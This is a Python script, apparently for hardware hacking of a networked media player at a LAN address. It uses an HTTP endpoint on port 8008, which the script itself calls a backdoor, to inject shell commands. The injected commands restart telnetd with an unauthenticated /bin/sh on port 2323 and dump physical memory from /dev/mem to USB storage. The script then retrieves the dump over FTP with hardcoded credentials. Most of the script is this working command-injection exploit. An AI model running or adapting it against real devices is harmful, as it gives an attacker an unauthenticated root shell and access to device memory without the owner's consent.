import urllib.request
import urllib.parse
import socket
import time
import ftplib
import struct

BOARD_IP = "192.168.1.4"

def send_http_cmd(cmd):
    url = f"http://{BOARD_IP}:8008/system?arg0=insert_key&arg1={urllib.parse.quote(cmd)}&arg2=4896"
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.read().decode('ascii', errors='ignore')
    except Exception as e:
        return str(e)

print("Starting telnet daemon via port 8008 backdoor...")
send_http_cmd("killall -9 telnetd; telnetd -l /bin/sh -p 2323")
time.sleep(1.0)

# Also dump LRAM immediately via HTTP command!
print("Dumping LRAM telemetry to USB drive...")
cmd_dd = "dd if=/dev/mem bs=4 skip=99918 count=8 2>/dev/null | dd of=/opt/sybhttpd/localhost.drives/USB_DRIVE/lram_res.bin"
send_http_cmd(cmd_dd)
time.sleep(1.0)

print("Fetching LRAM telemetry via FTP...")
ftp = ftplib.FTP(BOARD_IP, timeout=10)
ftp.login('nmt', '1234')
ftp.cwd('USB_DRIVE')
data = bytearray()
ftp.retrbinary('RETR lram_res.bin', data.extend)
ftp.quit()

print("=== DECODED LRAM MILESTONES ===")
if len(data) >= 4:
    words = struct.unpack('<' + 'I' * (len(data)//4), data[:len(data)-len(data)%4])
    for i, w in enumerate(words):
        print(f"LRAM +{i*4:02x} (0x{0x61938+i*4:05x}): 0x{w:08x}")
